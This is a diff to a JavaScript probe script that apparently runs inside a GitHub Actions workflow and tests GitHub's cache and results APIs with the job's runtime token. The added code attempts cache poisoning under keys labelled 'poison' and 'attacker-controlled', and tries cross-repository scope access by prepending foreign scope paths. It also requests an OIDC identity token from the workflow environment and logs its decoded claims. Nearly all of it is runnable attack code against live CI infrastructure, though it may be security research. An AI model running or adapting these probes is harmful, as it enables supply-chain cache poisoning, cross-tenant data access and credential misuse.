@@ -39,10 +39,26 @@ function show(name, r) { console.log(`P2 ${name} -> ${r.status} ${JSON.stringify
 
   // ---- Control: correct v2 CacheService on RESULTS url (toolkit v4 uses this host) ----
   const v2 = 'twirp/github.actions.results.api.v1.CacheService/';
-  show('v2_results_GetCacheEntryDownloadURL',
-    await req('POST', resultsBase + v2 + 'GetCacheEntryDownloadURL', RT, { key: 'i11100-poison', restoreKeys: [], version: 'i11100ver' }));
+  const VER64 = 'a3f6dd22c5cc42e4cd63a2622f528935cb038639db1c8ae2720e10f6e6606dc7';
+  show('v2_results_GetCacheEntryDownloadURL_knownver',
+    await req('POST', resultsBase + v2 + 'GetCacheEntryDownloadURL', RT, { key: 'i11100-poison', restoreKeys: [], version: VER64 }));
+  show('v2_results_GetCacheEntryDownloadURL_randkey',
+    await req('POST', resultsBase + v2 + 'GetCacheEntryDownloadURL', RT, { key: 'i11100-probe-nope', restoreKeys: [], version: VER64 }));
   show('v2_results_CreateCacheEntry',
-    await req('POST', resultsBase + v2 + 'CreateCacheEntry', RT, { key: 'i11100-poison-x', version: 'i11100ver' }));
+    await req('POST', resultsBase + v2 + 'CreateCacheEntry', RT, { key: 'i11100-probe-key', version: VER64 }));
+  show('v2_results_GetCacheEntryDownloadURL_restorekeys',
+    await req('POST', resultsBase + v2 + 'GetCacheEntryDownloadURL', RT, { key: 'i11100-nomatch', restoreKeys: ['i11100-'], version: VER64 }));
+
+  // cross-repo/scope attempt on the CORRECT results host with a foreign scope path prepended
+  const hostOnly = (() => { try { return new URL(RESULTS).host; } catch (e) { return 'results-receiver.actions.githubusercontent.com'; } })();
+  for (const fv of ['AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA', '0000000000000000000000000000000000000000000']) {
+    const fu = 'https://' + hostOnly + '/' + fv + '/' + v2 + 'GetCacheEntryDownloadURL';
+    show('v2_results_foreign_scope_' + fv.slice(0, 4),
+      await req('POST', fu, RT, { key: 'i11100-poison', restoreKeys: [], version: VER64 }));
+  }
+  // arbitrary-key write within our own scope: CreateCacheEntry for an attacker-chosen key
+  show('v2_results_CreateCacheEntry_attacker_key',
+    await req('POST', resultsBase + v2 + 'CreateCacheEntry', RT, { key: 'i11100-attacker-controlled', version: VER64 }));
 
   // ---- also try artifactcache host for v2 (in case) ----
   show('v2_artifactcache_GetCacheEntryDownloadURL',
@@ -73,5 +89,18 @@ function show(name, r) { console.log(`P2 ${name} -> ${r.status} ${JSON.stringify
 
   // ---- token vs api.github.com ----
   show('RT_vs_api_repo', await req('GET', 'https://api.github.com/repos/StephenClash/helloworld', RT));
+
+  // ---- OIDC id-token scope (is it run-bound?) ----
+  const OIDCU = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
+  const OIDCT = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN || '';
+  if (OIDCU) {
+    const r2 = await req('GET', OIDCU + (OIDCU.includes('?') ? '&' : '?') + 'audience=i11100aud', OIDCT);
+    console.log('OIDC_REQ_STATUS=' + r2.status);
+    try {
+      const j = JSON.parse(r2.body); const v = j.value || '';
+      const c = JSON.parse(Buffer.from(v.split('.')[1], 'base64').toString('utf8'));
+      console.log('OIDC_CLAIMS=' + JSON.stringify({ aud: c.aud, sub: c.sub, exp: c.exp, iat: c.iat, nbf: c.nbf, jti: c.jti, repository_id: c.repository_id, run_id: c.run_id, ref: c.ref, sha: c.sha }));
+    } catch (e) { console.log('OIDC_DECODE_ERR ' + e + ' ' + JSON.stringify(r2.body).slice(0, 200)); }
+  } else { console.log('NO_OIDC_URL'); }
   console.log('=== P2 DONE ===');
 })();
